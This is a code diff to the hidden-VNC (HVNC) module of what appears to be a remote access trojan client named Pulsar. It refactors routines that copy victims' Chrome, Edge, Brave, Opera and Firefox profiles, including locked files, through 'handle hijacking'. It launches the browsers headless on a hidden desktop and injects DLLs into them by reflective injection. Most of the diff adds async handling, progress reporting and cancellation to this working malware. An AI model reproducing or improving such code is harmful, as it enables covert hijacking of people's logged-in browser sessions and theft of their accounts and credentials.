@@ -30,6 +30,22 @@ namespace Pulsar.Client.Helper.HVNC
         private const uint INFINITE = 0xFFFFFFFF;
         private const int STARTF_USEPOSITION = 0x00000004;
 
+        private readonly struct CloneResult
+        {
+            public CloneResult(bool success, bool cancelled, string destination)
+            {
+                Success = success;
+                Cancelled = cancelled;
+                Destination = destination ?? string.Empty;
+            }
+
+            public bool Success { get; }
+
+            public bool Cancelled { get; }
+
+            public string Destination { get; }
+        }
+
         private void CloneDirectory(string sourceDir, string destinationDir)
         {
             if (!Directory.Exists(sourceDir))
@@ -89,6 +105,27 @@ namespace Pulsar.Client.Helper.HVNC
             return result;
         }
 
+        private void CleanupCancelledClone(string destinationDir)
+        {
+            if (string.IsNullOrWhiteSpace(destinationDir))
+            {
+                return;
+            }
+
+            try
+            {
+                if (Directory.Exists(destinationDir))
+                {
+                    Debug.WriteLine($"[BrowserClone] Cleaning up cancelled clone at '{destinationDir}'");
+                    DeleteFolder(destinationDir);
+                }
+            }
+            catch (Exception cleanupEx)
+            {
+                Debug.WriteLine($"[BrowserClone] Cleanup failed for '{destinationDir}': {cleanupEx.Message}");
+            }
+        }
+
         public void StartCmd()
         {
             string path = "conhost cmd.exe";
@@ -107,46 +144,94 @@ namespace Pulsar.Client.Helper.HVNC
             this.CreateProc(command);
         }
 
-        public void StartFirefox()
+        public async Task StartFirefoxAsync()
         {
+            BrowserCloneProgressSession progressSession = null;
+            Task completionTask = Task.CompletedTask;
+            bool cloneSucceeded = false;
+            bool cloneCancelled = false;
+
             try
             {
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";
+                string basePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Mozilla", "Firefox");
 
-                if (!Directory.Exists(path))
+                if (!Directory.Exists(basePath))
                 {
+                    Debug.WriteLine("Firefox base directory not found.");
                     return;
                 }
 
-                string sourceDir = Path.Combine(path, "Profiles");
+                string sourceDir = Path.Combine(basePath, "Profiles");
                 if (!Directory.Exists(sourceDir))
                 {
+                    Debug.WriteLine("Firefox profiles directory not found.");
                     return;
                 }
 
-                string text = Path.Combine(path, "fudasf");
-                if (!Directory.Exists(text))
+                string destination = Path.Combine(basePath, "fudasf");
+                if (Directory.Exists(destination))
                 {
-                    Directory.CreateDirectory(text);
-                    HandleHijacker.ForceCopyDirectory(sourceDir, text, killIfFailed: false);
+                    DeleteFolder(destination);
+                }
+
+                progressSession = await BrowserCloneProgressSession.TryCreateAsync("Firefox").ConfigureAwait(false);
+                progressSession?.ReportPreparing();
+
+                CancellationToken cancellationToken = progressSession?.CancellationToken ?? CancellationToken.None;
+
+                try
+                {
+                    cloneSucceeded = await Task.Run(() => HandleHijacker.ForceCopyDirectory(sourceDir, destination, killIfFailed: false, progressSession?.Progress, cancellationToken)).ConfigureAwait(false);
+                }
+                catch (OperationCanceledException)
+                {
+                    cloneCancelled = true;
+                    CleanupCancelledClone(destination);
+                }
+
+                if (cloneCancelled)
+                {
+                    Debug.WriteLine("Firefox profile cloning cancelled by user – skipping launch.");
+                }
+                else if (cloneSucceeded)
+                {
+                    Debug.WriteLine("Firefox profile cloned successfully.");
                 }
                 else
                 {
-                    DeleteFolder(text);
-                    this.StartFirefox();
+                    Debug.WriteLine("Firefox profile cloning reported partial success; some files may be locked.");
+                }
+
+                bool completedSuccessfully = cloneSucceeded && !cloneCancelled;
+                completionTask = progressSession?.ReportCompletionAsync(completedSuccessfully) ?? Task.CompletedTask;
+
+                if (cloneCancelled)
+                {
                     return;
                 }
 
-                string filePath2 = "Conhost --headless cmd.exe /c start firefox --profile=\"" + text + "\"";
-                this.CreateProc(filePath2);
+                string startCommand = $"Conhost --headless cmd.exe /c start firefox --profile=\"{destination}\"";
+                CreateProc(startCommand);
+            }
+            catch (OperationCanceledException)
+            {
+                completionTask = progressSession?.ReportCompletionAsync(false) ?? Task.CompletedTask;
+                cloneCancelled = true;
+                Debug.WriteLine("Firefox profile cloning cancelled by user.");
             }
             catch (Exception ex)
             {
+                completionTask = progressSession?.ReportCompletionAsync(false) ?? Task.CompletedTask;
                 Debug.WriteLine("Error starting Firefox: " + ex.Message);
+            }
+            finally
+            {
+                await completionTask.ConfigureAwait(false);
+                progressSession?.Dispose();
             }
         }
 
-        public void StartBrave(byte[] dllbytes)
+        public async Task StartBraveAsync(byte[] dllbytes)
         {
             try
             {
@@ -159,11 +244,16 @@ namespace Pulsar.Client.Helper.HVNC
 
                 Debug.WriteLine($"Found Brave at: {braveConfig.ExecutablePath}");
 
-                CloneBrowserProfile(braveConfig.SearchPattern, braveConfig.ReplacementPath);
+                var cloneResult = await CloneBrowserProfileAsync(braveConfig.SearchPattern, braveConfig.ReplacementPath, "Brave").ConfigureAwait(false);
+                if (cloneResult.Cancelled)
+                {
+                    Debug.WriteLine("Brave profile cloning cancelled by user – skipping injection.");
+                    return;
+                }
 
                 try
                 {
-                    KDOTInjector.Start(dllbytes, braveConfig.ExecutablePath, braveConfig.SearchPattern, braveConfig.ReplacementPath);
+                    await Task.Run(() => KDOTInjector.Start(dllbytes, braveConfig.ExecutablePath, braveConfig.SearchPattern, braveConfig.ReplacementPath)).ConfigureAwait(false);
                     Debug.WriteLine("Brave started successfully with reflective DLL injection.");
                 }
                 catch (Exception injectionEx)
@@ -171,13 +261,17 @@ namespace Pulsar.Client.Helper.HVNC
                     Debug.WriteLine($"Error during Brave DLL injection: {injectionEx.Message}");
                 }
             }
+            catch (OperationCanceledException)
+            {
+                Debug.WriteLine("Brave profile cloning cancelled by user.");
+            }
             catch (Exception ex)
             {
                 Debug.WriteLine("Error starting Brave: " + ex.Message);
             }
         }
 
-        public void StartOpera(byte[] dllbytes)
+        public async Task StartOperaAsync(byte[] dllbytes)
         {
             try
             {
@@ -190,20 +284,31 @@ namespace Pulsar.Client.Helper.HVNC
 
                 Debug.WriteLine($"Found Opera at: {operaConfig.ExecutablePath}");
 
-                CloneBrowserProfile(operaConfig.SearchPattern, operaConfig.ReplacementPath);
+                var cloneResult = await CloneBrowserProfileAsync(operaConfig.SearchPattern, operaConfig.ReplacementPath, "Opera").ConfigureAwait(false);
+                if (cloneResult.Cancelled)
+                {
+                    Debug.WriteLine("Opera profile cloning cancelled by user – skipping injection.");
+                    return;
+                }
 
                 try
                 {
-                    int processId = KDOTInjector.Start(dllbytes, operaConfig.ExecutablePath, operaConfig.SearchPattern, operaConfig.ReplacementPath);
+                    int processId = await Task.Run(() => KDOTInjector.Start(dllbytes, operaConfig.ExecutablePath, operaConfig.SearchPattern, operaConfig.ReplacementPath)).ConfigureAwait(false);
                     if (processId > 0)
                     {
                         Debug.WriteLine("Opera started successfully with reflective DLL injection.");
 
-                        // Apply Opera patcher asynchronously AFTER process is running
-                        Thread.Sleep(2000);
-                        Task.Run(async () =>
+                        await Task.Delay(2000).ConfigureAwait(false);
+                        _ = Task.Run(async () =>
                         {
-                            await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                            try
+                            {
+                                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000).ConfigureAwait(false);
+                            }
+                            catch (Exception patchEx)
+                            {
+                                Debug.WriteLine($"Opera patcher error: {patchEx.Message}");
+                            }
                         });
                     }
                     else
@@ -216,13 +321,17 @@ namespace Pulsar.Client.Helper.HVNC
                     Debug.WriteLine($"Error during Opera DLL injection: {injectionEx.Message}");
                 }
             }
+            catch (OperationCanceledException)
+            {
+                Debug.WriteLine("Opera profile cloning cancelled by user.");
+            }
             catch (Exception ex)
             {
                 Debug.WriteLine("Error starting Opera: " + ex.Message);
             }
         }
 
-        public void StartOperaGX(byte[] dllbytes)
+        public async Task StartOperaGXAsync(byte[] dllbytes)
         {
             try
             {
@@ -235,20 +344,31 @@ namespace Pulsar.Client.Helper.HVNC
 
                 Debug.WriteLine($"Found OperaGX at: {operaGXConfig.ExecutablePath}");
 
-                CloneBrowserProfile(operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath);
+                var cloneResult = await CloneBrowserProfileAsync(operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath, "Opera GX").ConfigureAwait(false);
+                if (cloneResult.Cancelled)
+                {
+                    Debug.WriteLine("OperaGX profile cloning cancelled by user – skipping injection.");
+                    return;
+                }
 
                 try
                 {
-                    int processId = KDOTInjector.Start(dllbytes, operaGXConfig.ExecutablePath, operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath);
+                    int processId = await Task.Run(() => KDOTInjector.Start(dllbytes, operaGXConfig.ExecutablePath, operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath)).ConfigureAwait(false);
                     if (processId > 0)
                     {
                         Debug.WriteLine("OperaGX started successfully with reflective DLL injection.");
 
-                        // Apply Opera patcher asynchronously AFTER process is running
-                        Thread.Sleep(2000);
-                        Task.Run(async () =>
+                        await Task.Delay(2000).ConfigureAwait(false);
+                        _ = Task.Run(async () =>
                         {
-                            await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                            try
+                            {
+                                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000).ConfigureAwait(false);
+                            }
+                            catch (Exception patchEx)
+                            {
+                                Debug.WriteLine($"OperaGX patcher error: {patchEx.Message}");
+                            }
                         });
                     }
                     else
@@ -261,13 +381,17 @@ namespace Pulsar.Client.Helper.HVNC
                     Debug.WriteLine($"Error during OperaGX DLL injection: {injectionEx.Message}");
                 }
             }
+            catch (OperationCanceledException)
+            {
+                Debug.WriteLine("OperaGX profile cloning cancelled by user.");
+            }
             catch (Exception ex)
             {
                 Debug.WriteLine("Error starting OperaGX: " + ex.Message);
             }
         }
 
-        public void StartEdge(byte[] dllbytes)
+        public async Task StartEdgeAsync(byte[] dllbytes)
         {
             try
             {
@@ -280,11 +404,16 @@ namespace Pulsar.Client.Helper.HVNC
 
                 Debug.WriteLine($"Found Edge at: {edgeConfig.ExecutablePath}");
 
-                CloneBrowserProfile(edgeConfig.SearchPattern, edgeConfig.ReplacementPath);
+                var cloneResult = await CloneBrowserProfileAsync(edgeConfig.SearchPattern, edgeConfig.ReplacementPath, "Edge").ConfigureAwait(false);
+                if (cloneResult.Cancelled)
+                {
+                    Debug.WriteLine("Edge profile cloning cancelled by user – skipping injection.");
+                    return;
+                }
 
                 try
                 {
-                    KDOTInjector.Start(dllbytes, edgeConfig.ExecutablePath, edgeConfig.SearchPattern, edgeConfig.ReplacementPath);
+                    await Task.Run(() => KDOTInjector.Start(dllbytes, edgeConfig.ExecutablePath, edgeConfig.SearchPattern, edgeConfig.ReplacementPath)).ConfigureAwait(false);
                     Debug.WriteLine("Edge started successfully with reflective DLL injection.");
                 }
                 catch (Exception injectionEx)
@@ -292,13 +421,17 @@ namespace Pulsar.Client.Helper.HVNC
                     Debug.WriteLine($"Error during Edge DLL injection: {injectionEx.Message}");
                 }
             }
+            catch (OperationCanceledException)
+            {
+                Debug.WriteLine("Edge profile cloning cancelled by user.");
+            }
             catch (Exception ex)
             {
                 Debug.WriteLine("Error starting Edge: " + ex.Message);
             }
         }
 
-        public void Startchrome(byte[] dllbytes)
+        public async Task StartChromeAsync(byte[] dllbytes)
         {
             try
             {
@@ -311,23 +444,30 @@ namespace Pulsar.Client.Helper.HVNC
 
                 Debug.WriteLine($"Found Chrome at: {chromeConfig.ExecutablePath}");
 
-                CloneBrowserProfile(chromeConfig.SearchPattern, chromeConfig.ReplacementPath);
+                var cloneResult = await CloneBrowserProfileAsync(chromeConfig.SearchPattern, chromeConfig.ReplacementPath, "Chrome").ConfigureAwait(false);
+                if (cloneResult.Cancelled)
+                {
+                    Debug.WriteLine("Chrome profile cloning cancelled by user – skipping injection.");
+                    return;
+                }
 
                 try
                 {
-                    KDOTInjector.Start(dllbytes, chromeConfig.ExecutablePath, chromeConfig.SearchPattern, chromeConfig.ReplacementPath);
+                    await Task.Run(() => KDOTInjector.Start(dllbytes, chromeConfig.ExecutablePath, chromeConfig.SearchPattern, chromeConfig.ReplacementPath)).ConfigureAwait(false);
                     Debug.WriteLine("Chrome started successfully with reflective DLL injection.");
                 }
                 catch (Exception injectionEx)
                 {
                     Debug.WriteLine($"Error during DLL injection: {injectionEx.Message}");
-                    return;
                 }
+            }
+            catch (OperationCanceledException)
+            {
+                Debug.WriteLine("Chrome profile cloning cancelled by user.");
             }
             catch (Exception ex)
             {
                 Debug.WriteLine("Error starting Chrome: " + ex.Message);
-                return;
             }
         }
 
@@ -335,17 +475,17 @@ namespace Pulsar.Client.Helper.HVNC
         private static extern uint ResumeThread(IntPtr hThread);
 
         /// <summary>
-        /// Generic method to start any browser by type with reflective DLL injection
+        /// Generic method to start any browser by type with reflective DLL injection.
         /// </summary>
         /// <param name="browserType">Type of browser (Chrome, Edge, Brave, Opera, OperaGX)</param>
         /// <param name="dllbytes">DLL bytes to inject</param>
-        public void StartBrowser(string browserType, byte[] dllbytes)
+        public async Task StartBrowserAsync(string browserType, byte[] dllbytes)
         {
             try
             {
                 if (browserType.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
                 {
-                    Startchrome(dllbytes);
+                    await StartChromeAsync(dllbytes).ConfigureAwait(false);
                     return;
                 }
 
@@ -364,7 +504,6 @@ namespace Pulsar.Client.Helper.HVNC
                 STARTUPINFO startupInfo = default(STARTUPINFO);
                 startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                 startupInfo.lpDesktop = this.DesktopName;
-                // Set position to 0,0 to ensure any windows open on main monitor
                 startupInfo.dwX = 0;
                 startupInfo.dwY = 0;
                 startupInfo.dwFlags = STARTF_USEPOSITION;
@@ -378,14 +517,19 @@ namespace Pulsar.Client.Helper.HVNC
                 else
                 {
                     Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
-                    Thread.Sleep(500);
+                    await Task.Delay(500).ConfigureAwait(false);
                 }
 
-                CloneBrowserProfile(config.SearchPattern, config.ReplacementPath);
+                var cloneResult = await CloneBrowserProfileAsync(config.SearchPattern, config.ReplacementPath, browserType).ConfigureAwait(false);
+                if (cloneResult.Cancelled)
+                {
+                    Debug.WriteLine($"{browserType} profile cloning cancelled by user – skipping injection.");
+                    return;
+                }
 
                 try
                 {
-                    int processId = KDOTInjector.Start(dllbytes, config.ExecutablePath, config.SearchPattern, config.ReplacementPath);
+                    int processId = await Task.Run(() => KDOTInjector.Start(dllbytes, config.ExecutablePath, config.SearchPattern, config.ReplacementPath)).ConfigureAwait(false);
                     if (processId > 0)
                     {
                         Debug.WriteLine($"{browserType} started successfully with reflective DLL injection.");
@@ -393,10 +537,17 @@ namespace Pulsar.Client.Helper.HVNC
                         if (browserType.Equals("Opera", StringComparison.OrdinalIgnoreCase) ||
                               browserType.Equals("OperaGX", StringComparison.OrdinalIgnoreCase))
                         {
-                            Thread.Sleep(2000);
-                            Task.Run(async () =>
+                            await Task.Delay(2000).ConfigureAwait(false);
+                            _ = Task.Run(async () =>
                             {
-                                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                                try
+                                {
+                                    await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000).ConfigureAwait(false);
+                                }
+                                catch (Exception patchEx)
+                                {
+                                    Debug.WriteLine($"{browserType} patcher error: {patchEx.Message}");
+                                }
                             });
                         }
                     }
@@ -409,6 +560,10 @@ namespace Pulsar.Client.Helper.HVNC
                 {
                     Debug.WriteLine($"Error during {browserType} DLL injection: {injectionEx.Message}");
                 }
+            }
+            catch (OperationCanceledException)
+            {
+                Debug.WriteLine($"{browserType} profile cloning cancelled by user.");
             }
             catch (Exception ex)
             {
@@ -466,54 +621,105 @@ namespace Pulsar.Client.Helper.HVNC
         }
 
         /// <summary>
-        /// Clones browser profile from SearchPattern to ReplacementPath
-        /// Uses handle hijacking to copy locked files without killing the browser
+        /// Clones browser profile from SearchPattern to ReplacementPath.
+        /// Executes on a background thread to avoid blocking message processing.
         /// </summary>
         /// <param name="searchPattern">Relative path pattern (e.g., "Local\Google\Chrome\User Data")</param>
         /// <param name="replacementPath">Relative path for destination (e.g., "Local\Google\Chrome\KDOT")</param>
-        private void CloneBrowserProfile(string searchPattern, string replacementPath)
+        private async Task<CloneResult> CloneBrowserProfileAsync(string searchPattern, string replacementPath, string browserName = null)
         {
+            BrowserCloneProgressSession progressSession = null;
+            Task completionTask = Task.CompletedTask;
+            CloneResult cloneResult = default;
+
             try
             {
-                string baseDir;
-                if (searchPattern.StartsWith("Local\\", StringComparison.OrdinalIgnoreCase))
-                {
-                    baseDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                    searchPattern = searchPattern.Substring(6); // rem "Local\" prefix
-                    replacementPath = replacementPath.Substring(6); // rem "Local\" prefix
-                }
-                else if (searchPattern.StartsWith("Roaming\\", StringComparison.OrdinalIgnoreCase))
-                {
-                    baseDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                    searchPattern = searchPattern.Substring(8); // rem "Roaming\" prefix
-                    replacementPath = replacementPath.Substring(8); // rem "Roaming\" prefix
-                }
-                else
-                {
-                    Debug.WriteLine($"Invalid search pattern format: {searchPattern}");
-                    return;
-                }
+                progressSession = await BrowserCloneProgressSession.TryCreateAsync(browserName).ConfigureAwait(false);
+                progressSession?.ReportPreparing();
 
-                string sourceDir = Path.Combine(baseDir, searchPattern);
-                string destDir = Path.Combine(baseDir, replacementPath);
+                CancellationToken cancellationToken = progressSession?.CancellationToken ?? CancellationToken.None;
+
+                cloneResult = await Task.Run(() => CloneBrowserProfileInternal(
+                    searchPattern,
+                    replacementPath,
+                    cancellationToken,
+                    progressSession?.Progress)).ConfigureAwait(false);
+
+                bool completedSuccessfully = cloneResult.Success && !cloneResult.Cancelled;
+                completionTask = progressSession?.ReportCompletionAsync(completedSuccessfully) ?? Task.CompletedTask;
+
+                return cloneResult;
+            }
+            catch
+            {
+                completionTask = progressSession?.ReportCompletionAsync(false) ?? Task.CompletedTask;
+                throw;
+            }
+            finally
+            {
+                await completionTask.ConfigureAwait(false);
+                progressSession?.Dispose();
+            }
+        }
+
+        private CloneResult CloneBrowserProfileInternal(
+            string searchPattern,
+            string replacementPath,
+            CancellationToken cancellationToken,
+            IProgress<BrowserCloneProgress> progress)
+        {
+            string localSearch = searchPattern;
+            string localReplacement = replacementPath;
+
+            string baseDir;
+            if (localSearch.StartsWith("Local\\", StringComparison.OrdinalIgnoreCase))
+            {
+                baseDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                localSearch = localSearch.Substring(6);
+                localReplacement = localReplacement.Substring(6);
+            }
+            else if (localSearch.StartsWith("Roaming\\", StringComparison.OrdinalIgnoreCase))
+            {
+                baseDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                localSearch = localSearch.Substring(8);
+                localReplacement = localReplacement.Substring(8);
+            }
+            else
+            {
+                Debug.WriteLine($"Invalid search pattern format: {localSearch}");
+                return new CloneResult(false, false, string.Empty);
+            }
+
+            string sourceDir = Path.Combine(baseDir, localSearch);
+            string destDir = Path.Combine(baseDir, localReplacement);
+
+            try
+            {
+                cancellationToken.ThrowIfCancellationRequested();
 
                 Debug.WriteLine($"Cloning browser profile from '{sourceDir}' to '{destDir}'");
 
                 if (!Directory.Exists(sourceDir))
                 {
                     Debug.WriteLine($"Source directory does not exist: {sourceDir}");
-                    return;
+                    return new CloneResult(false, false, destDir);
                 }
 
-                // get rid of it if it's already there
                 if (Directory.Exists(destDir))
                 {
                     Debug.WriteLine($"Removing existing destination directory: {destDir}");
                     DeleteFolder(destDir);
                 }
 
+                cancellationToken.ThrowIfCancellationRequested();
+
                 Debug.WriteLine("[BrowserClone] Using handle hijacking for locked files...");
-                bool success = HandleHijacker.ForceCopyDirectory(sourceDir, destDir, killIfFailed: false);
+                bool success = HandleHijacker.ForceCopyDirectory(
+                    sourceDir,
+                    destDir,
+                    killIfFailed: false,
+                    progress,
+                    cancellationToken);
 
                 if (success)
                 {
@@ -523,10 +729,20 @@ namespace Pulsar.Client.Helper.HVNC
                 {
                     Debug.WriteLine("[BrowserClone] Handle hijacking partial success, some files may be skipped.");
                 }
+
+                return new CloneResult(success, false, destDir);
+            }
+            catch (OperationCanceledException)
+            {
+                Debug.WriteLine("[BrowserClone] Operation cancelled by user.");
+                CleanupCancelledClone(destDir);
+                return new CloneResult(false, true, destDir);
             }
             catch (Exception ex)
             {
                 Debug.WriteLine($"Error cloning browser profile: {ex.Message}");
+                CleanupCancelledClone(destDir);
+                throw;
             }
         }
 
@@ -557,7 +773,7 @@ namespace Pulsar.Client.Helper.HVNC
             }
         }
 
-        public void StartGenericChromium(byte[] dllbytes, string browserPath, string searchPattern, string replacementPath)
+        public async Task StartGenericChromiumAsync(byte[] dllbytes, string browserPath, string searchPattern, string replacementPath)
         {
             try
             {
@@ -583,7 +799,6 @@ namespace Pulsar.Client.Helper.HVNC
                 STARTUPINFO startupInfo = default(STARTUPINFO);
                 startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                 startupInfo.lpDesktop = this.DesktopName;
-                // Set position to 0,0 to ensure any windows open on main monitor
                 startupInfo.dwX = 0;
                 startupInfo.dwY = 0;
                 startupInfo.dwFlags = STARTF_USEPOSITION;
@@ -598,20 +813,35 @@ namespace Pulsar.Client.Helper.HVNC
                 else
                 {
                     Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
-                    Thread.Sleep(500);
+                    await Task.Delay(500).ConfigureAwait(false);
                 }
 
-                CloneBrowserProfile(searchPattern, replacementPath);
+                string friendlyName = Path.GetFileNameWithoutExtension(browserPath);
+                if (string.IsNullOrWhiteSpace(friendlyName))
+                {
+                    friendlyName = "Chromium";
+                }
+
+                var cloneResult = await CloneBrowserProfileAsync(searchPattern, replacementPath, friendlyName).ConfigureAwait(false);
+                if (cloneResult.Cancelled)
+                {
+                    Debug.WriteLine("Generic Chromium profile cloning cancelled by user – skipping injection.");
+                    return;
+                }
 
                 try
                 {
-                    KDOTInjector.Start(dllbytes, browserPath, searchPattern, replacementPath);
+                    await Task.Run(() => KDOTInjector.Start(dllbytes, browserPath, searchPattern, replacementPath)).ConfigureAwait(false);
                     Debug.WriteLine($"Generic Chromium browser started successfully with reflective DLL injection.");
                 }
                 catch (Exception injectionEx)
                 {
                     Debug.WriteLine($"Error during generic Chromium DLL injection: {injectionEx.Message}");
                 }
+            }
+            catch (OperationCanceledException)
+            {
+                Debug.WriteLine("Generic Chromium profile cloning cancelled by user.");
             }
             catch (Exception ex)
             {
